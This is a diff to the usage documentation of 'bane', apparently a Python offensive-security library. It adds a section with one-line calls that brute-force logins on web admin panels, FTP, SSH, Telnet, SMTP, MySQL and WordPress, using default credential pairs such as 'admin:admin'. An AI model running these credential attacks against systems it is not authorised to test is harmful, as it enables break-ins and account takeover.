@@ -366,3 +366,20 @@ II-Usage (General usage):
 <br>bane.base64encodefl( file )
 <h4>File content decoding with base64:</h4>
 <br>bane.base64decodefl( file )
+
+# Bruteforcing:
+
+<h4>Admin panel on web page:</h4>
+<br>bane.admin_brute_force(link , word_list=["admin:admin","admin:1234"] , timeout=15 )
+<h4>FTP server:</h4>
+<br>bane.hydra(IP , protocol="ftp" , word_list=["admin:admin","admin:1234"] , timeout=5 )
+<h4>SSH server: (if you are on windows, please install Putty)</h4>
+<br>bane.hydra(IP , p=22 , protocol="ssh" , word_list=["admin:admin","admin:1234"] , timeout=5 )
+<h4>TELNET server:</h4>
+<br>bane.hydra(IP , p=23 , protocol="telnet" , word_list=["admin:admin","admin:1234"] , timeout=5 )
+<h4>SMTP server:</h4>
+<br>bane.hydra(IP , p=25 , protocol="smtp" , ehlo=False , helo=True , ttls=False , word_list=["admin:admin","admin:1234"] , timeout=5 )
+<h4>MySQL server:</h4>
+<br>bane.hydra(IP , p=3306 , protocol="mysqlt" , word_list=["admin:admin","admin:1234"] , timeout=5 )
+<h4>WordPress login page:</h4>
+<br>bane.hydra(link , protocol="wp" , word_list=["admin:admin","admin:1234"] , timeout=15 )
